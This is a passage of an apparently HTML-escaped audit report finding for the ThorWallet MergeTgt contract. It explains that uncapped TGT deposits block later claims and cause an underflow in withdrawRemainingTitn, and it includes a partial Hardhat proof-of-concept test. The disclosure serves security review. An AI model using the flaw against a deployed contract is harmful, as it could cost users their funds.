href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-584\"\u003e0xTonraq\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-253\"\u003e4B\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-783\"\u003eAbhan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-529\"\u003eagadzhalov\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-49\"\u003eanchabadze\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-705\"\u003earman\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-149\"\u003earnie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-745\"\u003easter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-411\"\u003eBenterkiii\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-283\"\u003eboredpukar\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-345\"\u003eBz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-200\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-201\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-204\"\u003eChainSentry\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-493\"\u003eColdless\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-219\"\u003ecrmx_lom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-701\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-733\"\u003eDaniel_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-10\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-12\"\u003eDaniel526\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-667\"\u003eDemoreX\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-766\"\u003edobrevaleri\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-108\"\u003eeldar_m10v\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-790\"\u003eewwrekt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-809\"\u003ehjo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-628\"\u003eIceBear\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-491\"\u003eIlloy-Scizceneghposter\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-652\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-660\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-661\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-359\"\u003eITCruiser\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-174\"\u003ejkk812812\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-453\"\u003eKannAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-720\"\u003eKannAudits\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-433\"\u003ekn0t\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-481\"\u003eleegh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-375\"\u003eMSK\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-195\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-197\"\u003eMylifechangefast_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-686\"\u003enatachi\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-658\"\u003epeanuts\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-565\"\u003ephoenixV110\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-562\"\u003eREKCAH\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-189\"\u003esafie\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-184\"\u003esaikumar279\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-250\"\u003eSaurabh_Singh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-403\"\u003eshaflow2\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-140\"\u003esilver_eth\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-635\"\u003esohrabhind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-649\"\u003esohrabhind\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-535\"\u003eStriking_Lions\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-792\"\u003eTakarez\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-107\"\u003eteoslaf\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-181\"\u003etpiliposian\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-426\"\u003eUzeyirCh\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-616\"\u003ew33kEd\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-603\"\u003ewahedtalash77\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-114\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-56\"\u003eweb3km\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-639\"\u003eyaioxy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-221\"\u003ezhanmingjing\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-147\"\u003ezraxx\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-02-thorwallet/submissions/S-236\"\u003eZZhelev\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81\"\u003ehttps://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L81\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eMergeTgt has hardcoded amounts of TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE and TITN\u003cem\u003eARB. Their ratio is used for rate calculation and TITN\u003c/em\u003eARB amount of TITN is deposited to be claimed.\u003c/p\u003e\n\u003cp\u003eThe contract has no actual logic which would limit the deposited Tgt to MergeTgt. This means if this amount is crossed, any last claimers will not be able to do so or retrieve their Tgt back.\u003c/p\u003e\n\u003cp\u003eThis same vulnerability also introduces an overflow in \u003ccode\u003ewithdrawRemainingTitn\u003c/code\u003e. Since TGT is allowed to exceed the hardcoded value, the claimable TINT exceeds the actual mergeTgt contract TITN balance.\u003c/p\u003e\n\u003cp\u003eAnd this line overflows, as \u003ccode\u003eremainingTitnAfter1Year\u003c/code\u003e becomes less than the \u003ccode\u003einitialTotalClaimable\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"0\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003euint256 unclaimedTitn = remainingTitnAfter1Year - initialTotalClaimable;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLikelihood: Medium - The total Tgt of all users has to exceed TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE. According to blockchain explorers, ARB has 447,034,102 and ETH has 897,791,792, which is more than double the TGT\u003cem\u003eTO\u003c/em\u003eEXCHANGE of 579,000,000, so quite likely.\u003c/p\u003e\n\u003cp\u003eImpact: High - loss of user funds and breaking contract logic (revert on claim).\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eA modified MNrgeTgt.test.ts. Main modifications:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTGT total supply is increased above 579\u003cem\u003e000\u003c/em\u003e000 \u003c/li\u003e\n\u003cli\u003eAll user total TGT deposit to mergeTGT is above 579\u003cem\u003e000\u003c/em\u003e000 \u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSteps in tests:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUser1 deposits 100 TGT\u003c/li\u003e\n\u003cli\u003eUser2 deposits 578999999 TGT\u003c/li\u003e\n\u003cli\u003eUser1 claims successfully\u003c/li\u003e\n\u003cli\u003eUser2 claim fails due to mergeTgt not having enough TITN.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"1\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSignerWithAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@nomiclabs/hardhat-ethers/signers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@nomicfoundation/hardhat-network-helpers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;chai\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;ethers\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployments\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;hardhat\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;@layerzerolabs/lz-v2-utilities\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Audit MergeTgt tests\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Constant representing a mock Endpoint ID for testing purposes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Other variables to be used in the test suite\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eSignerWithAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Before hook for setup that runs once before all tests in the block\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Contract factory for our tested contract\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Titn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan 